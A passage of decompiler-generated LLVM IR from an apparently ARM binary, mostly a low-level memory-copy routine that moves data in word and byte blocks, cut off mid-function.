  uselistorder i32 72, { 2, 0, 1 }
  uselistorder i32 64, { 16, 12, 13, 0, 7, 46, 8, 14, 9, 15, 17, 18, 10, 19, 20, 21, 1, 22, 23, 24, 2, 25, 26, 27, 11, 28, 29, 30, 3, 31, 32, 33, 4, 34, 35, 36, 37, 38, 5, 39, 40, 41, 42, 43, 6, 44, 45 }
  uselistorder i32 56, { 4, 2, 3, 6, 5, 0, 1 }
  uselistorder i32 52, { 2, 3, 0, 1, 4, 5, 6 }
  uselistorder i32 15, { 13, 12, 11, 2, 0, 21, 3, 4, 5, 6, 7, 8, 9, 14, 15, 10, 16, 17, 18, 19, 1, 20 }
  uselistorder i32 14, { 9, 8, 17, 7, 1, 2, 3, 4, 5, 10, 11, 6, 12, 13, 14, 15, 0, 16 }
  uselistorder i32 13, { 16, 12, 11, 4, 2, 13, 14, 15, 46, 0, 1, 5, 6, 7, 8, 17, 18, 19, 20, 21, 9, 22, 23, 24, 25, 26, 27, 28, 29, 10, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 3, 44, 45 }
  uselistorder i32 9, { 47, 48, 49, 10, 5, 70, 6, 39, 7, 64, 36, 12, 41, 13, 40, 11, 3, 65, 37, 66, 2, 38, 14, 68, 69, 15, 42, 43, 16, 17, 18, 44, 19, 45, 20, 46, 0, 21, 22, 23, 24, 1, 25, 26, 67, 50, 51, 8, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 4, 63, 27, 28, 29, 30, 31, 32, 33, 34, 35, 71, 72, 9, 73 }
  uselistorder i32 (i8*, i32)* @function_13c90, { 1, 0, 8, 7, 5, 2, 3, 4, 6 }
  uselistorder i32 88, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
}

define i32 @function_158a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_158a8:
  ret i32 %arg1
}

define i32 @function_158b0() local_unnamed_addr {
dec_label_pc_158b0:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_158b0 = load i32, i32* @r1, align 4
  %v1_158b0 = load i32, i32* @r0, align 4
  %v2_158b0 = sub i32 %v0_158b0, %v1_158b0
  %v3_158b0 = icmp ult i32 %v0_158b0, %v1_158b0
  %v4_158b0 = xor i32 %v1_158b0, %v0_158b0
  %v5_158b0 = xor i32 %v2_158b0, %v0_158b0
  %v6_158b0 = and i32 %v5_158b0, %v4_158b0
  %v7_158b0 = icmp slt i32 %v6_158b0, 0
  store i1 %v7_158b0, i1* %cpsr_v.global-to-local, align 1
  %v8_158b0 = icmp slt i32 %v2_158b0, 0
  store i1 %v8_158b0, i1* %cpsr_n.global-to-local, align 1
  %v9_158b0 = icmp eq i32 %v0_158b0, %v1_158b0
  store i1 %v9_158b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_158b0, label %dec_label_pc_15afc, label %dec_label_pc_158b8

dec_label_pc_158b8:                               ; preds = %dec_label_pc_158b0
  br i1 %v9_158b0, label %.thread122, label %bb

.thread122:                                       ; preds = %bb144, %.thread121, %bb141, %dec_label_pc_158b8
  %merge = phi i32 [ %v0_158b0, %dec_label_pc_158b8 ], [ %v2_15b90, %bb141 ], [ %v11_15bac, %bb144 ], [ %v7_15bac, %.thread121 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_158b8
  store i32 %v1_158b0, i32* %stack_var_-8, align 4
  %v0_158c0 = load i32, i32* @r2, align 4
  %v2_158c0 = add i32 %v0_158c0, -4
  store i32 %v2_158c0, i32* %r2.global-to-local, align 4
  %v4_158c0 = sub i32 3, %v0_158c0
  %v5_158c0 = and i32 %v4_158c0, %v0_158c0
  %v6_158c0 = icmp slt i32 %v5_158c0, 0
  store i1 %v6_158c0, i1* %cpsr_v.global-to-local, align 1
  %v7_158c0 = icmp slt i32 %v2_158c0, 0
  store i1 %v7_158c0, i1* %cpsr_n.global-to-local, align 1
  %v8_158c0 = icmp eq i32 %v0_158c0, 4
  store i1 %v8_158c0, i1* %cpsr_z.global-to-local, align 1
  %v5_158c4 = icmp slt i32 %v0_158c0, 4
  br i1 %v5_158c4, label %bb131, label %dec_label_pc_158c8

dec_label_pc_158c8:                               ; preds = %bb
  %v1_158c8 = urem i32 %v1_158b0, 4
  store i32 %v1_158c8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_158c8 = icmp eq i32 %v1_158c8, 0
  store i1 %v2_158c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158c8, label %dec_label_pc_158d0, label %dec_label_pc_15974

dec_label_pc_158d0:                               ; preds = %dec_label_pc_158c8
  %v1_158d0 = urem i32 %v0_158b0, 4
  store i32 %v1_158d0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_158d0 = icmp eq i32 %v1_158d0, 0
  store i1 %v2_158d0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_158b0 to i2
  br i1 %v2_158d0, label %dec_label_pc_158d8, label %dec_label_pc_159a4

dec_label_pc_158d8:                               ; preds = %dec_label_pc_158d0, %dec_label_pc_1599c
  %v0_158f092 = phi i32 [ %v1_158b0, %dec_label_pc_158d0 ], [ %v0_159ec75, %dec_label_pc_1599c ]
  %v0_158ec91 = phi i32 [ %v0_158b0, %dec_label_pc_158d0 ], [ %v0_1599c, %dec_label_pc_1599c ]
  %v0_158d8 = phi i32 [ %v2_158c0, %dec_label_pc_158d0 ], [ %v2_15994, %dec_label_pc_1599c ]
  %v2_158d8 = add i32 %v0_158d8, -8
  store i32 %v2_158d8, i32* %r2.global-to-local, align 4
  %v4_158d8 = sub i32 7, %v0_158d8
  %v5_158d8 = and i32 %v4_158d8, %v0_158d8
  %v6_158d8 = icmp slt i32 %v5_158d8, 0
  store i1 %v6_158d8, i1* %cpsr_v.global-to-local, align 1
  %v7_158d8 = icmp slt i32 %v2_158d8, 0
  store i1 %v7_158d8, i1* %cpsr_n.global-to-local, align 1
  %v8_158d8 = icmp eq i32 %v0_158d8, 8
  store i1 %v8_158d8, i1* %cpsr_z.global-to-local, align 1
  %v5_158dc = icmp slt i32 %v0_158d8, 8
  br i1 %v5_158dc, label %dec_label_pc_1592c, label %dec_label_pc_158e0

dec_label_pc_158e0:                               ; preds = %dec_label_pc_158d8
  %v2_158e0 = add i32 %v0_158d8, -28
  store i32 %v2_158e0, i32* %r2.global-to-local, align 4
  %v4_158e0 = sub i32 27, %v0_158d8
  %v5_158e0 = and i32 %v4_158e0, %v2_158d8
  %v6_158e0 = icmp slt i32 %v5_158e0, 0
  store i1 %v6_158e0, i1* %cpsr_v.global-to-local, align 1
  %v7_158e0 = icmp slt i32 %v2_158e0, 0
  store i1 %v7_158e0, i1* %cpsr_n.global-to-local, align 1
  %v8_158e0 = icmp eq i32 %v2_158d8, 20
  store i1 %v8_158e0, i1* %cpsr_z.global-to-local, align 1
  %v5_158e4 = icmp slt i32 %v2_158d8, 20
  br i1 %v5_158e4, label %dec_label_pc_15918, label %dec_label_pc_158e8

dec_label_pc_158e8:                               ; preds = %dec_label_pc_158e0
  %v0_158e8 = load i32, i32* @r4, align 4
  store i32 %v0_158e8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_158ec

dec_label_pc_158ec:                               ; preds = %dec_label_pc_158ec.dec_label_pc_158ec_crit_edge, %dec_label_pc_158e8
  %v0_158f0 = phi i32 [ %v12_158f8, %dec_label_pc_158ec.dec_label_pc_158ec_crit_edge ], [ %v0_158f092, %dec_label_pc_158e8 ]
  %v0_158ec = phi i32 [ %v0_158ec.pre, %dec_label_pc_158ec.dec_label_pc_158ec_crit_edge ], [ %v0_158ec91, %dec_label_pc_158e8 ]
  %v1_158ec = inttoptr i32 %v0_158ec to i32*
  %v2_158ec = load i32, i32* %v1_158ec, align 4
  store i32 %v2_158ec, i32* %r3.global-to-local, align 4
  %v3_158ec = add i32 %v0_158ec, 4
  %v4_158ec = inttoptr i32 %v3_158ec to i32*
  %v5_158ec = load i32, i32* %v4_158ec, align 4
  store i32 %v5_158ec, i32* %r4.global-to-local, align 4
  %v6_158ec = add i32 %v0_158ec, 8
  %v7_158ec = inttoptr i32 %v6_158ec to i32*
  %v8_158ec = load i32, i32* %v7_158ec, align 4
  store i32 %v8_158ec, i32* %ip.global-to-local, align 4
  %v9_158ec = add i32 %v0_158ec, 12
  %v10_158ec = inttoptr i32 %v9_158ec to i32*
  %v11_158ec = load i32, i32* %v10_158ec, align 4
  store i32 %v11_158ec, i32* %lr.global-to-local, align 4
  %v12_158ec = add i32 %v0_158ec, 16
  store i32 %v12_158ec, i32* %r1.global-to-local, align 4
  %v1_158f0 = inttoptr i32 %v0_158f0 to i32*
  store i32 %v2_158ec, i32* %v1_158f0, align 4
  %v3_158f0 = add i32 %v0_158f0, 4
  %v4_158f0 = inttoptr i32 %v3_158f0 to i32*
  %v5_158f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_158f0, i32* %v4_158f0, align 4
  %v6_158f0 = add i32 %v0_158f0, 8
  %v7_158f0 = inttoptr i32 %v6_158f0 to i32*
  %v8_158f0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_158f0, i32* %v7_158f0, align 4
  %v9_158f0 = add i32 %v0_158f0, 12
  %v10_158f0 = inttoptr i32 %v9_158f0 to i32*
  %v11_158f0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_158f0, i32* %v10_158f0, align 4
  %v12_158f0 = add i32 %v0_158f0, 16
  store i32 %v12_158f0, i32* %r0.global-to-local, align 4
  %v0_158f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_158f4 = inttoptr i32 %v0_158f4 to i32*
  %v2_158f4 = load i32, i32* %v1_158f4, align 4
  store i32 %v2_158f4, i32* %r3.global-to-local, align 4
  %v3_158f4 = add i32 %v0_158f4, 4
  %v4_158f4 = inttoptr i32 %v3_158f4 to i32*
  %v5_158f4 = load i32, i32* %v4_158f4, align 4
  store i32 %v5_158f4, i32* %r4.global-to-local, align 4
  %v6_158f4 = add i32 %v0_158f4, 8
  %v7_158f4 = inttoptr i32 %v6_158f4 to i32*
  %v8_158f4 = load i32, i32* %v7_158f4, align 4
  store i32 %v8_158f4, i32* @ip, align 4
  %v9_158f4 = add i32 %v0_158f4, 12
  %v10_158f4 = inttoptr i32 %v9_158f4 to i32*
  %v11_158f4 = load i32, i32* %v10_158f4, align 4
  store i32 %v11_158f4, i32* @lr, align 4
  %v12_158f4 = add i32 %v0_158f4, 16
  store i32 %v12_158f4, i32* @r1, align 4
  %v1_158f8 = inttoptr i32 %v12_158f0 to i32*
  store i32 %v2_158f4, i32* %v1_158f8, align 4
  %v3_158f8 = add i32 %v0_158f0, 20
  %v4_158f8 = inttoptr i32 %v3_158f8 to i32*
  %v5_158f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_158f8, i32* %v4_158f8, align 4
  %v6_158f8 = add i32 %v0_158f0, 24
  %v7_158f8 = inttoptr i32 %v6_158f8 to i32*
  %v8_158f8 = load i32, i32* @ip, align 4
  store i32 %v8_158f8, i32* %v7_158f8, align 4
  %v9_158f8 = add i32 %v0_158f0, 28
  %v10_158f8 = inttoptr i32 %v9_158f8 to i32*
  %v11_158f8 = load i32, i32* @lr, align 4
  store i32 %v11_158f8, i32* %v10_158f8, align 4
  %v12_158f8 = add i32 %v0_158f0, 32
  store i32 %v12_158f8, i32* @r0, align 4
  %v0_158fc = load i32, i32* %r2.global-to-local, align 4
  %v2_158fc = add i32 %v0_158fc, -32
  store i32 %v2_158fc, i32* %r2.global-to-local, align 4
  %v6_15900 = icmp slt i32 %v0_158fc, 32
  br i1 %v6_15900, label %dec_label_pc_15904, label %dec_label_pc_158ec.dec_label_pc_158ec_crit_edge

dec_label_pc_158ec.dec_label_pc_158ec_crit_edge:  ; preds = %dec_label_pc_158ec
  %v0_158ec.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_158ec

dec_label_pc_15904:                               ; preds = %dec_label_pc_158ec
  %v4_15904 = add i32 %v0_158fc, -16
  %v6_15904 = add i32 %v0_158fc, 2147483616
  %v7_15904 = and i32 %v4_15904, %v6_15904
  %v8_15904 = icmp slt i32 %v7_15904, 0
  store i1 %v8_15904, i1* %cpsr_v.global-to-local, align 1
  %v9_15904 = icmp slt i32 %v4_15904, 0
  store i1 %v9_15904, i1* %cpsr_n.global-to-local, align 1
  %v10_15904 = icmp eq i32 %v4_15904, 0
  store i1 %v10_15904, i1* %cpsr_z.global-to-local, align 1
  %v5_15908 = icmp slt i32 %v2_158fc, -16
  br i1 %v5_15908, label %.thread1, label %bb128

bb128:                                            ; preds = %dec_label_pc_15904
  %v6_15908 = load i32, i32* @r1, align 4
  %v7_15908 = inttoptr i32 %v6_15908 to i32*
  %v8_15908 = load i32, i32* %v7_15908, align 4
  store i32 %v8_15908, i32* %r3.global-to-local, align 4
  %v9_15908 = add i32 %v6_15908, 4
  %v10_15908 = inttoptr i32 %v9_15908 to i32*
  %v11_15908 = load i32, i32* %v10_15908, align 4
  store i32 %v11_15908, i32* %r4.global-to-local, align 4
  %v12_15908 = add i32 %v6_15908, 8
  %v13_15908 = inttoptr i32 %v12_15908 to i32*
  %v14_15908 = load i32, i32* %v13_15908, align 4
  store i32 %v14_15908, i32* @ip, align 4
  %v15_15908 = add i32 %v6_15908, 12
  %v16_15908 = inttoptr i32 %v15_15908 to i32*
  %v17_15908 = load i32, i32* %v16_15908, align 4
  store i32 %v17_15908, i32* @lr, align 4
  %v18_15908 = add i32 %v6_15908, 16
  store i32 %v18_15908, i32* @r1, align 4
  %v7_1590c = inttoptr i32 %v12_158f8 to i32*
  store i32 %v8_15908, i32* %v7_1590c, align 4
  %v9_1590c = add i32 %v0_158f0, 36
  %v10_1590c = inttoptr i32 %v9_1590c to i32*
  %v11_1590c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_1590c, i32* %v10_1590c, align 4
  %v12_1590c = add i32 %v0_158f0, 40
  %v13_1590c = inttoptr i32 %v12_1590c to i32*
  %v14_1590c = load i32, i32* @ip, align 4
  store i32 %v14_1590c, i32* %v13_1590c, align 4
  %v15_1590c = add i32 %v0_158f0, 44
  %v16_1590c = inttoptr i32 %v15_1590c to i32*
  %v17_1590c = load i32, i32* @lr, align 4
  store i32 %v17_1590c, i32* %v16_1590c, align 4
  %v18_1590c = add i32 %v0_158f0, 48
  store i32 %v18_1590c, i32* @r0, align 4
  %v6_15910 = load i32, i32* %r2.global-to-local, align 4
  %v7_15910 = add i32 %v6_15910, -16
  store i32 %v7_15910, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15904, %bb128
  %v3_15920101 = phi i32 [ %v12_158f8, %dec_label_pc_15904 ], [ %v18_1590c, %bb128 ]
  %v0_1591895 = phi i32 [ %v2_158fc, %dec_label_pc_15904 ], [ %v7_15910, %bb128 ]
  %v2_15914 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15914, i32* @r4, align 4
  br label %dec_label_pc_15918

dec_label_pc_15918:                               ; preds = %dec_label_pc_158e0, %.thread1
  %v3_15920100 = phi i32 [ %v0_158f092, %dec_label_pc_158e0 ], [ %v3_15920101, %.thread1 ]
  %v0_15918 = phi i32 [ %v2_158e0, %dec_label_pc_158e0 ], [ %v0_1591895, %.thread1 ]
  %v1_15918 = add i32 %v0_15918, 20
  store i32 %v1_15918, i32* %r2.global-to-local, align 4
  %v3_15918 = sub i32 0, %v0_15918
  %v4_15918 = and i32 %v1_15918, %v3_15918
  %v5_15918 = icmp slt i32 %v4_15918, 0
  store i1 %v5_15918, i1* %cpsr_v.global-to-local, align 1
  %v6_15918 = icmp slt i32 %v1_15918, 0
  store i1 %v6_15918, i1* %cpsr_n.global-to-local, align 1
  %v7_15918 = icmp eq i32 %v1_15918, 0
  store i1 %v7_15918, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1591c

dec_label_pc_1591c:                               ; preds = %.thread117, %dec_label_pc_15918
  %v0_1592c.pre147 = phi i32 [ %v0_1592c.pre, %.thread117 ], [ %v1_15918, %dec_label_pc_15918 ]
  %v3_15920 = phi i32 [ %v3_1592098118, %.thread117 ], [ %v3_15920100, %dec_label_pc_15918 ]
  %v1_15924 = phi i1 [ %v1_15928, %.thread117 ], [ %v5_15918, %dec_label_pc_15918 ]
  %v0_15924 = phi i1 [ %v0_15928, %.thread117 ], [ %v6_15918, %dec_label_pc_15918 ]
  %v2_1591c = xor i1 %v1_15924, %v0_15924
  br i1 %v2_1591c, label %.thread117, label %bb129

bb129:                                            ; preds = %dec_label_pc_1591c
  %v3_1591c = load i32, i32* @r1, align 4
  %v4_1591c = inttoptr i32 %v3_1591c to i32*
  %v5_1591c = load i32, i32* %v4_1591c, align 4
  store i32 %v5_1591c, i32* %r3.global-to-local, align 4
  %v6_1591c = add i32 %v3_1591c, 4
  %v7_1591c = inttoptr i32 %v6_1591c to i32*
  %v8_1591c = load i32, i32* %v7_1591c, align 4
  store i32 %v8_1591c, i32* @ip, align 4
  %v9_1591c = add i32 %v3_1591c, 8
  %v10_1591c = inttoptr i32 %v9_1591c to i32*
  %v11_1591c = load i32, i32* %v10_1591c, align 4
  store i32 %v11_1591c, i32* @lr, align 4
  %v12_1591c = add i32 %v3_1591c, 12
  store i32 %v12_1591c, i32* @r1, align 4
  %v4_15920 = inttoptr i32 %v3_15920 to i32*
  store i32 %v5_1591c, i32* %v4_15920, align 4
  %v6_15920 = add i32 %v3_15920, 4
  %v7_15920 = inttoptr i32 %v6_15920 to i32*
  %v8_15920 = load i32, i32* @ip, align 4
  store i32 %v8_15920, i32* %v7_15920, align 4
  %v9_15920 = add i32 %v3_15920, 8
  %v10_15920 = inttoptr i32 %v9_15920 to i32*
  %v11_15920 = load i32, i32* @lr, align 4
  store i32 %v11_15920, i32* %v10_15920, align 4
  %v12_15920 = add i32 %v3_15920, 12
  store i32 %v12_15920, i32* @r0, align 4
  %v3_15924 = load i32, i32* %r2.global-to-local, align 4
  %v4_15924 = add i32 %v3_15924, -12
  store i32 %v4_15924, i32* %r2.global-to-local, align 4
  %v6_15924 = sub i32 11, %v3_15924
  %v7_15924 = and i32 %v6_15924, %v3_15924
  %v8_15924 = icmp slt i32 %v7_15924, 0
  store i1 %v8_15924, i1* %cpsr_v.global-to-local, align 1
  %v9_15924 = icmp slt i32 %v4_15924, 0
  store i1 %v9_15924, i1* %cpsr_n.global-to-local, align 1
  %v10_15924 = icmp eq i32 %v3_15924, 12
  store i1 %v10_15924, i1* %cpsr_z.global-to-local, align 1
  br label %.thread117

.thread117:                                       ; preds = %dec_label_pc_1591c, %bb129
  %v0_1592c.pre = phi i32 [ %v4_15924, %bb129 ], [ %v0_1592c.pre147, %dec_label_pc_1591c ]
  %v3_1592098118 = phi i32 [ %v12_15920, %bb129 ], [ %v3_15920, %dec_label_pc_1591c ]
  %v1_15928 = phi i1 [ %v8_15924, %bb129 ], [ %v1_15924, %dec_label_pc_1591c ]
  %v0_15928 = phi i1 [ %v9_15924, %bb129 ], [ %v0_15924, %dec_label_pc_1591c ]
  %v2_15928 = xor i1 %v1_15928, %v0_15928
  br i1 %v2_15928, label %dec_label_pc_1592c, label %dec_label_pc_1591c

dec_label_pc_1592c:                               ; preds = %.thread117, %dec_label_pc_158d8
  %v7_1593c = phi i32 [ %v0_158f092, %dec_label_pc_158d8 ], [ %v3_1592098118, %.thread117 ]
  %v0_1592c = phi i32 [ %v2_158d8, %dec_label_pc_158d8 ], [ %v0_1592c.pre, %.thread117 ]
  %v2_1592c = add i32 %v0_1592c, 8
  store i32 %v2_1592c, i32* %r2.global-to-local, align 4
  %v4_1592c = sub i32 0, %v0_1592c
  %v5_1592c = and i32 %v2_1592c, %v4_1592c
  %v6_1592c = icmp slt i32 %v5_1592c, 0
  store i1 %v6_1592c, i1* %cpsr_v.global-to-local, align 1
  %v7_1592c = icmp slt i32 %v2_1592c, 0
  store i1 %v7_1592c, i1* %cpsr_n.global-to-local, align 1
  %v8_1592c = icmp eq i32 %v2_1592c, 0
  store i1 %v8_1592c, i1* %cpsr_z.global-to-local, align 1
  %v5_15930 = icmp slt i32 %v0_1592c, -8
  br i1 %v5_15930, label %bb131, label %dec_label_pc_15934

dec_label_pc_15934:                               ; preds = %dec_label_pc_1592c
  %v6_15934 = add i32 %v0_1592c, 4
  store i32 %v6_15934, i32* %r2.global-to-local, align 4
  %v8_15934 = sub i32 -5, %v0_1592c
  %v9_15934 = and i32 %v8_15934, %v2_1592c
  %v10_15934 = icmp slt i32 %v9_15934, 0
  store i1 %v10_15934, i1* %cpsr_v.global-to-local, align 1
  %v11_15934 = icmp slt i32 %v6_15934, 0
  store i1 %v11_15934, i1* %cpsr_n.global-to-local, align 1
  %v12_15934 = icmp eq i32 %v2_1592c, 4
  store i1 %v12_15934, i1* %cpsr_z.global-to-local, align 1
  %v5_15938 = icmp slt i32 %v2_1592c, 4
  %v6_15938 = load i32, i32* @r1, align 4
  %v7_15938 = inttoptr i32 %v6_15938 to i32*
  %v8_15938 = load i32, i32* %v7_15938, align 4
  store i32 %v8_15938, i32* %r3.global-to-local, align 4
  %v10_15938 = add i32 %v6_15938, 4
  br i1 %v5_15938, label %.thread5, label %bb130

.thread5:                                         ; preds = %dec_label_pc_15934
  store i32 %v10_15938, i32* @r1, align 4
  %v8_1593c = inttoptr i32 %v7_1593c to i32*
  store i32 %v8_15938, i32* %v8_1593c, align 4
  %v9_1593c = load i32, i32* @r0, align 4
  %v10_1593c = add i32 %v9_1593c, 4
  store i32 %v10_1593c, i32* @r0, align 4
  %v0_1594c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb131

bb130:                                            ; preds = %dec_label_pc_15934
  %v10_15940 = inttoptr i32 %v10_15938 to i32*
  %v11_15940 = load i32, i32* %v10_15940, align 4
  store i32 %v11_15940, i32* @ip, align 4
  %v12_15940 = add i32 %v6_15938, 8
  store i32 %v12_15940, i32* @r1, align 4
  %v7_15944 = inttoptr i32 %v7_1593c to i32*
  store i32 %v8_15938, i32* %v7_15944, align 4
  %v9_15944 = add i32 %v7_1593c, 4
  %v10_15944 = inttoptr i32 %v9_15944 to i32*
  %v11_15944 = load i32, i32* @ip, align 4
  store i32 %v11_15944, i32* %v10_15944, align 4
  %v12_15944 = add i32 %v7_1593c, 8
  store i32 %v12_15944, i32* @r0, align 4
  %v6_15948 = load i32, i32* %r2.global-to-local, align 4
  %v7_15948 = add i32 %v6_15948, -4
  store i32 %v7_15948, i32* %r2.global-to-local, align 4
  br label %bb131

bb131:                                            ; preds = %.thread5, %.thread11, %dec_label_pc_1592c, %bb, %dec_label_pc_15af4, %dec_label_pc_15a88, %dec_label_pc_15a1c, %bb130
  %v2_1595c = phi i32 [ %v10_1593c, %.thread5 ], [ %v0_159ec75, %.thread11 ], [ %v7_1593c, %dec_label_pc_1592c ], [ %v1_158b0, %bb ], [ %v2_1595c113, %dec_label_pc_15af4 ], [ %v2_1595c112, %dec_label_pc_15a88 ], [ %v2_1595c111, %dec_label_pc_15a1c ], [ %v12_15944, %bb130 ]
  %v0_1594c = phi i32 [ %v0_1594c.pre, %.thread5 ], [ %v2_15994, %.thread11 ], [ %v2_1592c, %dec_label_pc_1592c ], [ %v2_158c0, %bb ], [ %v0_1594c109, %dec_label_pc_15af4 ], [ %v0_1594c108, %dec_label_pc_15a88 ], [ %v0_1594c107, %dec_label_pc_15a1c ], [ %v7_15948, %bb130 ]
  %v1_1594c = add i32 %v0_1594c, 4
  store i32 %v1_1594c, i32* %r2.global-to-local, align 4
  %v3_1594c = sub i32 0, %v0_1594c
  %v4_1594c = and i32 %v1_1594c, %v3_1594c
  %v5_1594c = icmp slt i32 %v4_1594c, 0
  store i1 %v5_1594c, i1* %cpsr_v.global-to-local, align 1
  %v6_1594c = icmp slt i32 %v1_1594c, 0
  store i1 %v6_1594c, i1* %cpsr_n.global-to-local, align 1
  %v7_1594c = icmp eq i32 %v1_1594c, 0
  store i1 %v7_1594c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1594c, label %bb132, label %bb133

bb132:                                            ; preds = %bb131
  %v3_15950 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_15950, i32* %r0.global-to-local, align 4
  ret i32 %v3_15950

bb133:                                            ; preds = %bb131
  %v1_15954 = add i32 %v0_1594c, 2
  %v3_15954 = sub i32 -3, %v0_1594c
  %v4_15954 = and i32 %v3_15954, %v1_1594c
  %v5_15954 = icmp slt i32 %v4_15954, 0
  store i1 %v5_15954, i1* %cpsr_v.global-to-local, align 1
  %v6_15954 = icmp slt i32 %v1_15954, 0
  store i1 %v6_15954, i1* %cpsr_n.global-to-local, align 1
  %v7_15954 = icmp eq i32 %v1_1594c, 2
  store i1 %v7_15954, i1* %cpsr_z.global-to-local, align 1
  %v0_15958 = load i32, i32* @r1, align 4
  %v1_15958 = inttoptr i32 %v0_15958 to i8*
  %v2_15958 = load i8, i8* %v1_15958, align 1
  %v3_15958 = zext i8 %v2_15958 to i32
  store i32 %v3_15958, i32* %r3.global-to-local, align 4
  %v5_15958 = add i32 %v0_15958, 1
  store i32 %v5_15958, i32* %r1.global-to-local, align 4
  %v3_1595c = inttoptr i32 %v2_1595c to i8*
  store i8 %v2_15958, i8* %v3_1595c, align 1
  %v4_1595c = load i32, i32* @r0, align 4
  %v5_1595c = add i32 %v4_1595c, 1
  store i32 %v5_1595c, i32* %r0.global-to-local, align 4
  %v0_15960 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15960 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15960 = xor i1 %v0_15960, %v1_15960
  br i1 %v2_15960, label %.thread119, label %bb134

bb134:                                            ; preds = %bb133
  %v3_15960 = load i32, i32* %r1.global-to-local, align 4
  %v4_15960 = inttoptr i32 %v3_15960 to i8*
  %v5_15960 = load i8, i8* %v4_15960, align 1
  %v6_15960 = zext i8 %v5_15960 to i32
  store i32 %v6_15960, i32* %r3.global-to-local, align 4
  %v8_15960 = add i32 %v3_15960, 1
  store i32 %v8_15960, i32* %r1.global-to-local, align 4
  %v6_15964 = inttoptr i32 %v5_1595c to i8*
  store i8 %v5_15960, i8* %v6_15964, align 1
  %v7_15964 = load i32, i32* %r0.global-to-local, align 4
  %v8_15964 = add i32 %v7_15964, 1
  store i32 %v8_15964, i32* %r0.global-to-local, align 4
  %v1_15968.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15968.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread119

.thread119:                                       ; preds = %bb133, %bb134
  %v7_1596c = phi i32 [ %v8_15964, %bb134 ], [ %v5_1595c, %bb133 ]
  %v2_1596c = phi i1 [ %v2_15968.pre, %bb134 ], [ %v1_15960, %bb133 ]
  %v1_1596c = phi i1 [ %v1_15968.pre, %bb134 ], [ %v0_15960, %bb133 ]
  %v0_15968 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_15968 = xor i1 %v2_1596c, %v1_1596c
  %v4_15968 = or i1 %v0_15968, %v3_15968
  br i1 %v4_15968, label %.thread120, label %bb135

bb135:                                            ; preds = %.thread119
  %v5_15968 = load i32, i32* %r1.global-to-local, align 4
  %v6_15968 = inttoptr i32 %v5_15968 to i8*
  %v7_15968 = load i8, i8* %v6_15968, align 1
  %v8_15968 = zext i8 %v7_15968 to i32
  store i32 %v8_15968, i32* %r3.global-to-local, align 4
  %v10_15968 = add i32 %v5_15968, 1
  store i32 %v10_15968, i32* %r1.global-to-local, align 4
  %v8_1596c = inttoptr i32 %v7_1596c to i8*
  store i8 %v7_15968, i8* %v8_1596c, align 1
  %v9_1596c = load i32, i32* %r0.global-to-local, align 4
  %v10_1596c = add i32 %v9_1596c, 1
  store i32 %v10_1596c, i32* %r0.global-to-local, align 4
  br label %.thread120

.thread120:                                       ; preds = %.thread119, %bb135
  %v2_15970 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15970, i32* %r0.global-to-local, align 4
  ret i32 %v2_15970

dec_label_pc_15974:                               ; preds = %dec_label_pc_158c8
  %v1_15974 = sub nsw i32 4, %v1_158c8
  store i32 %v1_15974, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_15978 = icmp ult i32 %v1_15974, 2
  store i1 %v8_15978, i1* %cpsr_n.global-to-local, align 1
  %v9_15978 = icmp eq i32 %v1_15974, 2
  store i1 %v9_15978, i1* %cpsr_z.global-to-local, align 1
  %v1_1597c = inttoptr i32 %v0_158b0 to i8*
  %v2_1597c = load i8, i8* %v1_1597c, align 1
  %v3_1597c = zext i8 %v2_1597c to i32
  store i32 %v3_1597c, i32* %r3.global-to-local, align 4
  %v5_1597c = add i32 %v0_158b0, 1
  store i32 %v5_1597c, i32* @r1, align 4
  %v3_15980 = inttoptr i32 %v1_158b0 to i8*
  store i8 %v2_1597c, i8* %v3_15980, align 1
  %v4_15980 = load i32, i32* @r0, align 4
  %v5_15980 = add i32 %v4_15980, 1
  store i32 %v5_15980, i32* @r0, align 4
  br i1 %v8_15978, label %.thread11, label %bb136

bb136:                                            ; preds = %dec_label_pc_15974
  %v6_15984 = load i32, i32* @r1, align 4
